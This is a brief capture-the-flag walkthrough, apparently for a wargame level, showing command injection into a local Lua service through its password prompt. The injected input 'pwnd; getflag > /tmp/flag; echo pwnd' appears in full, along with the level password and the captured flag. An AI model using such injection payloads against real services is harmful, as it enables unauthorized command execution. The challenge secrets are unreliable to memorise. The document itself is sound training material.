# level11

## Vulnerability: Unchecked input leading to code injection

level11's password: `feulo4b72j7edeahuete3no7c`

1. examinate existing files and permissions

```shell
ls -la
```

shows a lua script that is supposed to run on 127.0.0.1:5151, with flag11 permissions

2. try to connect to it with netcat

```shell
nc 127.0.0.1 5151
```

Asking for a password, as expected

3. inject some code to trick the script to run getflag for us

```shell
pwnd; getflag > /tmp/flag; echo pwnd
cat /tmp/flag
```

gives flag `fa6v5ateaw21peobuub8ipe6s`
